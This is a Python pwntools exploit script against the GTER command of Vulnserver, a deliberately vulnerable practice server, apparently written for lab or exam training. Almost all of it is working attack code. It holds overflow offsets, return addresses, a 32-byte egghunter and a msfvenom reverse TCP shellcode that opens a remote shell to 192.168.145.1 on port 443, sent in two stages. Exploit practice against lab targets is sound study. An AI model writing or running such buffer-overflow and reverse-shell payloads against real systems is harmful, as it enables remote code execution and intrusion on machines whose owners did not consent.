#!/usr/bin/python3

# ============================================
# Vulnserver GTER exploit via 2 stage payload
# ============================================

from pwn import *

# === Target info ===
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# === Initial Variables ===
vulncmd = b"GTER /.:/"  # this should cause the crash
crash = 2000  # a payload of this size triggers the crash
offset = 147
ebpoffset = 143
# jmp ebp location in little endian, because somehow jmp esp doesnt work
jmpebp = p32(0x625011f9)
jmpesp = p32(0x62501203)

badchars = b""
for i in range(0x01, 0xFF+1):  # same as 1 to 256
    badchars += str.encode(chr(i))

# 32 byte egghunter - egg w00t
egghunter = (
    b"\xcc"  # breakpoint
    b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    b"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)
# === Payload ===

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
shellcode = binascii.unhexlify("ba7c02711bdbd8d97424f45e29c9b15283c60431560e032a0c93ee2ef8d111cef9b5982bc8f5ff387bc6746c70add98403c3f5aba46e208235c21085b519456587d19864c00c5034995bc7a8ae16d443fcb75cb0b5b64d67cde04d860299c79047a49e2bb35221fd8d9b8ec0216ece058591a57ff52cbe4487ea4b5e2f78ebbad1ad6a49dd1af815c29d2d2efe16d0e0766cf724d236967dbe99a79d614502d68c923fb5d857724519f005362b5fbed0072818276703dcb796ac1d9e5cf84d887581054879548918d5076ac895f702021a27322df040d9d493aeb6476247c567642c40810c42051ab9fb0cd058039b9d5b8f286215784470c288132a45968942090556924436c1c501881883bfb3b2b13d25fc719a9603786fa2276aa92b6cde657a3a88c3d48c629a8b46e25be05874642d2f98d59876a7da4c7fd006ed800b831dcb11a2b592c0f6db243f34e2a6b5c511b6bcc05e702db9cf15516eef3f")

payload = b"".join([
    vulncmd,
    egghunter,
    b"A" * (ebpoffset - len(egghunter)),
    b"BBBB",
    jmpesp,
    #b"\xcc",  # for testing purposes
    asm("add eax, 0x9; call eax")
])

payload += b"C" * (crash - len(payload))  # padding

sendshell = b"".join([
    b"TRUN .",
    b"w00tw00t",
    shellcode

])
# first we put a shellcode in memory
print("[+] Sending first stage payload")
s.send(sendshell)
print("[*] First stage egghunter payload sent!")

# then we send an egghunter to look for it
print("[+] Sending second stage payload..")
s.send(payload)
print("[*] Second stage egghunter payload sent!")

s.close()
